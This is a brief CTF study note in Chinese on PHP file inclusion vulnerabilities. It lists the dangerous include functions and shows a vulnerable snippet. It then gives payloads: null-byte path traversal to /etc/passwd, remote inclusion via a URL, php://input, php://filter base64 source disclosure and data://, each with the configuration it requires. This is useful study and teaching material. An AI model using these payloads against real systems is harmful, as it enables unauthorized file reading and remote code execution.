# File Inclusion
常見危險函式：  
PHP: `include()`, `include_once()`, `require()`, `require_once()`, `fopen()`, `readfile()`  
JSP: `java.io.FileReader()`  
ASP: `includefile`  
php包含一個文件，會將該文件內容當作php代碼執行，因此不受檔名類型影響。  

# Local File Inclusion
比賽中我對lfi漏洞的挖掘還是很不敏感：  
幾場ctf的經驗累積下來，只要通過檔名或者帶有**路徑**的檔名，就應該試試看有沒有lfi  
```php
$file = $_GET['file'];
include '/var/www/'.$file.'.php';
```
1. `%00`截斷  
```php
// 用%00截斷後面的副檔名
file=../../../../../../../../etc/passwd%00
```
requirement: `magic_quotes_gpc=off`, php < 5.3.4  
2. 長度截斷  

# Remote File Inclusion
```php
require_once $path."/hello/index.php";
```
1. 普通版 rfi  
```php
// 加個protocal
path = [http/https/ftp]://hello.com/.php
```
requirement: `allow_url_fopen=On`, `allow_url_include=On`  
2. `php://input`  
requirement: `allow_url_include=On`  
3. `php://filter`  放大絕，爆源碼  
```php
php://filter/convert.base64-encode/resource=[file.php]
```
requirement: `allow_url_include=On`  
4. `data://text/plain`
